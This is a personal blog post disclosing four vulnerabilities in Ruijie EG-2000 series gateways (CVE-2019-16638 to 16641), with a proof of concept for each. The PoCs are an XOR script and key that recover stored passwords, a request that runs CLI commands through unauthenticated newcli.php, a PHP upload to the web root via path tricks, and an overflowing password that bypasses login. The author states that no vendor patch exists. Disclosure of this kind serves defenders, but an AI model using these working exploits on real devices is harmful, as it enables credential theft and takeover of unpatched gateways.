=== Content from 0x.mk_57d5639e_20250110_144447.html ===


[双草酸酯的博客](https://0x.mk/ "双草酸酯的博客")

 切换导航

* [首页](https://0x.mk/ "首页")
* [关于](https://0x.mk/?page_id=27 "关于")
* [友情链接](https://0x.mk/?page_id=28 "友情链接")

# Ruijie EG-2000 series multiple vulnerabilities

#### 于2024年7月16日由[**双草酸酯**](https://0x.mk/?author=1)发布

We found multiple vulnerabilities based on EG-2000SE Next Gen Gateway.

## **CVE-2019-16638: User password is stored with symmetric encryption**

CWE-257: Storing Passwords in a Recoverable Format

An issue was found on the Ruijie EG-2000 series gateway. An attacker can easily dump cleartext stored passwords in `/data/config.text` with simple XORs. This was tested on EG-2000SE EG\_RGOS 11.1(1)B1.

PoC:

```
import binascii
KEYTBL = b"*@##Wxf^cOurGer*mArKLe%aIRwolf&^StarRdH#&)####^*$%!!#&)%071177"
pwd_enc = "1044407451471c"
pwd = binascii.unhexlify(pwd_enc[2:])
offset = int(pwd_enc[:2])
result = bytearray()
for i in range(len(pwd)):
    result.append(pwd[i] ^ KEYTBL[i + offset])
print(result)
```
## **CVE-2019-16639: Arbitrary command execution on newcli.php**

CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

An issue was found on the Ruijie EG-2000 series gateway. There is a newcli.php API interface without access control, which can allow an attacker (who only has web interface access) to use TELNET commands and/or show admin passwords via the mode\_url=exec&command= substring.
This affects EG-2000SE EG\_RGOS 11.9 B11P1.

PoC:

```
POST /newcli.php HTTP/1.1
Cookies: [REDACTED]
Content-Type: application/x-www-form-urlencoded

mode_url=exec&command=show%20webmaster%20users
```
## **CVE-2019-16640: PHP file upload via upload.php**

CWE-434: Unrestricted Upload of File with Dangerous Type

An issue was found in upload.php on the Ruijie EG-2000 series gateway. A parameter passed to the class UploadFile is mishandled (%00 and /var/./html are not checked), which can allow an attacker to upload any file to the gateway.
This affects EG-2000SE EG\_RGOS 11.9 B11P1.

PoC:

```
POST upload.php?c=upload&a=index&fileext=txt&filedir=%2Fvar%2Fhtml&obj=1&_ruijie_upload%5B%5D=1
Cookies: [REDACTED]
Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
Content-Length: 554

-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name="file"; filename="/var/./html/poc.php"

<?php phpinfo();
-----------------------------9051914041544843365972754266--
```
## **CVE-2019-16641: Buffer overflow on login.php**

CWE-121: Stack-based Buffer Overflow

An issue was found on the Ruijie EG-2000 series gateway. There is a buffer overflow in client.so. Consequently, an attacker can use login.php to login to any account, without providing its password.
This affects EG-2000SE EG\_RGOS 11.1(1)B1.

PoC:

```
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

username=admin&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

For all of the vulnerabilities I found, I have submitted bug report to Ruijie on 10/14/2019, but I didn’t get any response from them. The official patch of these vulnerabilities is not available.

分类： [未分类](https://0x.mk/?cat=1)

---

### 0 条评论

### 发表回复 [取消回复](/?p=239#respond)

![Avatar placeholder](https://0x.mk/wp-content/themes/hestia/assets/img/placeholder.jpg)

您的邮箱地址不会被公开。 必填项已用 \* 标注

   名称 \*
  电子邮件 \*
  网站
 在想些什么？

Δ

搜索：

##### 近期文章

* [Ruijie EG-2000 series multiple vulnerabilities](https://0x.mk/?p=239)
* [CrackProof壳分析（1）](https://0x.mk/?p=220)
* [久违的博客更新](https://0x.mk/?p=209)
* [Unity全自动hook的实现](https://0x.mk/?p=192)
* [自动评教脚本](https://0x.mk/?p=166)
##### 近期评论

* KeRnEl32 发表在《[CrackProof壳分析（1）](https://0x.mk/?p=220#comment-5816)》
* watcherman 发表在《[久违的博客更新](https://0x.mk/?p=209#comment-5573)》
* ZDemon 发表在《[CrackProof壳分析（1）](https://0x.mk/?p=220#comment-5506)》
* DE 发表在《[CrackProof壳分析（1）](https://0x.mk/?p=220#comment-5504)》
* 双草酸酯 发表在《[Unity全自动hook的实现](https://0x.mk/?p=192#comment-5500)》
##### 归档

* [2024 年 7 月](https://0x.mk/?m=202407)
* [2021 年 9 月](https://0x.mk/?m=202109)
* [2021 年 7 月](https://0x.mk/?m=202107)
* [2020 年 3 月](https://0x.mk/?m=202003)
* [2019 年 6 月](https://0x.mk/?m=201906)
* [2019 年 5 月](https://0x.mk/?m=201905)
* [2019 年 4 月](https://0x.mk/?m=201904)
* [2019 年 1 月](https://0x.mk/?m=201901)
* [2018 年 12 月](https://0x.mk/?m=201812)
* [2018 年 8 月](https://0x.mk/?m=201808)
* [2018 年 5 月](https://0x.mk/?m=201805)
* [2017 年 12 月](https://0x.mk/?m=201712)
* [2017 年 11 月](https://0x.mk/?m=201711)
* [2017 年 10 月](https://0x.mk/?m=201710)
* [2017 年 9 月](https://0x.mk/?m=201709)
* [2017 年 6 月](https://0x.mk/?m=201706)
##### 分类

* [lua](https://0x.mk/?cat=9)
* [RFID](https://0x.mk/?cat=3)
* [SIF](https://0x.mk/?cat=8)
* [未分类](https://0x.mk/?cat=1)
* [编译](https://0x.mk/?cat=4)
* [路由器](https://0x.mk/?cat=7)
* [逆向](https://0x.mk/?cat=11)
##### 其他操作

* [登录](https://0x.mk/wp-login.php)
* [条目 feed](https://0x.mk/?feed=rss2)
* [评论 feed](https://0x.mk/?feed=comments-rss2)
* [WordPress.org](https://cn.wordpress.org/)

## 相关文章

###### [未分类](https://0x.mk/?cat=1 "查看未分类中的全部文章")

#### [久违的博客更新](https://0x.mk/?p=209 "久违的博客更新")

·系统滚到了Ubuntu 20.04·Nginx启用了TLS 1.3和 [阅读更多…](https://0x.mk/?p=209)

###### [未分类](https://0x.mk/?cat=1 "查看未分类中的全部文章")

#### [自动评教脚本](https://0x.mk/?p=166 "自动评教脚本")

由于教务系统的沙雕设计，评教十分费劲，每两个按钮点击间隔需要大于1.5 [阅读更多…](https://0x.mk/?p=166)

###### [未分类](https://0x.mk/?cat=1 "查看未分类中的全部文章")

#### [免客户端薅学校正版软件羊毛](https://0x.mk/?p=161 "免客户端薅学校正版软件羊毛")

首先，查询这个网站以获取你要激活的客户端的client key 然后， [阅读更多…](https://0x.mk/?p=161)

* [关于](https://0x.mk/?page_id=27)
* [友情链接](https://0x.mk/?page_id=28)
* [示例页面](https://0x.mk/?page_id=2)
* [网页](https://0x.mk/?page_id=203)

Hestia |由[ThemeIsle](https://themeisle.com)开发


